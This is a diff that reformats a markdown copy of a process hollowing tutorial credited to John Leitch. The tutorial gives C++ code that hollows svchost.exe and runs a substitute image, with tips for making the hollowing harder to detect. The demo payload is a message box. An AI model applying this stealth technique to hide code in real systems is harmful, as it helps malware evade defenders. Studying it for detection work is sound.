@@ -1,10 +1,10 @@
-#Process Hollowing
+# Process Hollowing
 Full Credits to: John Leitch john@autosectools.com http://www.autosectools.com
 
-#Introduction
+# Introduction
 Process hollowing is yet another tool in the kit of those who seek to hide the presence of a process. The idea is rather straight forward: a bootstrap application creates a seemingly innocent process in a suspended state. The legitimate image is then unmapped and replaced with the image that is to be hidden. If the preferred image base of the new image does not match that of the old image, the new image must be rebased. Once the new image is loaded in memory the EAX register of the suspended thread is set to the entry point. The process is then resumed and the entry point of the new image is executed.
 
-#Building The Source Executable
+# Building The Source Executable
 To successfully perform process hollowing the source image must meet a few requirements:
 
 To maximize compatibility, the subsystem of the source image should be set to windows.
@@ -16,6 +16,7 @@ Once a suitable source executable has been created it can be loaded in the conte
 Creating The Process
 The target process must be created in the suspended state. This can be achieved by passing the CREATE_SUSPENDED flag to the CreateProcess function via the dwCreationFlags parameter.
 
+```cpp
 printf("Creating process\r\n");
  
 LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
@@ -41,26 +42,32 @@ if (!pProcessInfo->hProcess)
  
       return;
 }
+```
 
  
 Once the process is created its memory space can be modified using the handle provided by the hProcess member of the PROCESS_INFORMATION structure.
 
-#Gathering Information
+# Gathering Information
 First, the base address of the destination image must be located. This can be done by querying the process with NtQueryProcessInformation to acquire the address of the process environment block (PEB). The PEB is then read using ReadProcessMemory. All of this functionality is encapsulated within a convenient helper function named ReadRemotePEB.
 
+```cpp
 PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
+```
  
 Once the PEB is read from the process, the image base is used to read the NT headers. Once again ReadProcessMemory is utilized, and the functionality is wrapped in a convenient helper function.
 
+```cpp
 PLOADED_IMAGE pImage = ReadRemoteImage
 (
       pProcessInfo->hProcess,
       pPEB->ImageBaseAddress
 );
+```
  
 Carving The Hole
 With headers in hand there is no longer a need for the destination image to be mapped into memory. The NtUnmapViewOfSection function can be utilized to get rid of it. 
 
+```cpp
 printf("Unmapping destination section\r\n");
  
 HMODULE hNTDLL = GetModuleHandleA("ntdll");
@@ -85,9 +92,11 @@ if (dwResult)
       printf("Error unmapping section\r\n");
       return;
 }
+```
  
 Next, a new block of memory is allocated for the source image. The size of the block is determined by the SizeOfImage member of the source images optional header. For the sake of simplicity the entire block is flagged as PAGE_EXECUTE_READWRITE, but this could be improved upon by allocating each portable executable section with the appropriate flags based on the characteristics specified in the section header.
 
+```cpp
 printf("Allocating memory\r\n");
  
 PVOID pRemoteImage = VirtualAllocEx
@@ -104,10 +113,12 @@ if (!pRemoteImage)
       printf("VirtualAllocEx call failed\r\n");
       return;
 }
+```
  
-#Copying The Source Image
+# Copying The Source Image
 Now that memory has been allocated for the new image it must be copied to the process memory.  For the hollowing to work, the image base stored within the optional header of the source image must be set to the destination image base address. However, before setting it the difference between the two base addresses must be calculated for use in rebasing. Once the optional header is fixed up, the image is copied to the process via WriteProcessMemory starting with its portable executable headers. Following that, the data of each section is copied. 
 
+```cpp
 DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
       pSourceHeaders->OptionalHeader.ImageBase;
  
@@ -166,8 +177,9 @@ for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
             printf ("Error writing process memory\r\n");
             return;
       }
-}    
- 
+}
+```
+
 As was mentioned earlier taking this step a bit further by applying the proper memory protection options to the different sections would make the hollowing harder to detect.
 
 Rebasing The Source Image
@@ -178,6 +190,7 @@ IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->
  
 The relocation table itself is broken down into a series of variable length blocks, each containing a series of entries for a 4KB page. At the head of each relocation block is the page address along with the block size, followed by the relocation entries. Each relocation entry is a single word; the low 12 bits are the relocation offset, and the high 4 bits are the relocation types. C bit fields can be used to easily access these values.
 
+```cpp
 typedef struct BASE_RELOCATION_BLOCK {
       DWORD PageAddress;
       DWORD BlockSize;
@@ -187,9 +200,11 @@ typedef struct BASE_RELOCATION_ENTRY {
       USHORT Offset : 12;
       USHORT Type : 4;
 } BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
+```
  
 To calculate the number of entries in a block, the size of BASE_RELOCATION_BLOCK is subtracted from BlockSize and the difference is divided by the size of BASE_RELOCATION_ENTRY. The macro below assists in these calculations.
 
+```cpp
 #define CountRelocationEntries(dwBlockSize)           \
       (dwBlockSize -                                  \
       sizeof(BASE_RELOCATION_BLOCK)) /                \
@@ -254,10 +269,12 @@ while (dwOffset < relocData.Size)
             }
       }
 }
+```
  
-#The Final Touches
+# The Final Touches
 With the source image loaded into the target process some changes need to be made to the process thread. First, the thread context must be acquired. Because only the EAX register needs to be updated the ContextFlags member of the CONTEXT structure can be set to CONTEXT_INTEGER.
  
+```cpp
 LPCONTEXT pContext = new CONTEXT();
 pContext->ContextFlags = CONTEXT_INTEGER;
  
@@ -268,9 +285,11 @@ if (!GetThreadContext(pProcessInfo->hThread, pContext))
       printf("Error getting context\r\n");
       return;
 }
+```
  
 After the thread context has been acquired the EAX member is set to the sum of the base address and the entry point address of the source image.
 
+```cpp
 DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
       pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
  
@@ -285,9 +304,11 @@ if (!SetThreadContext(pProcessInfo->hThread, pContext))
       printf("Error setting context\r\n");
       return;
 }
+```
  
 Finally, the thread is resumed, executing the entry point of the source image.                     
 
+```cpp
 printf("Resuming thread\r\n");
  
 if (!ResumeThread(pProcessInfo->hThread))
@@ -295,9 +316,11 @@ if (!ResumeThread(pProcessInfo->hThread))
       printf("Error resuming thread\r\n");
       return;
 }
+```
  
 The hollowing function is now ready to use. To test it, svchost.exe (the Windows service host) is hollowed out and replaced with a simple application that displays a message box.
 
+```cpp
 int _tmain(int argc, _TCHAR* argv[])
 {
       char* pPath = new char[MAX_PATH];
@@ -315,6 +338,7 @@ int _tmain(int argc, _TCHAR* argv[])
  
       return 0;
 }
+```
  
 Once the application is run, its output confirms that the hollowing was successful.
 
@@ -339,7 +363,7 @@ Resuming thread
 Process hollowing complete
 Press any key to continue . . .
  
-#Resources
+# Resources
 Process Hollowing Source
 http://code.google.com/p/process-hollowing/downloads/list
  
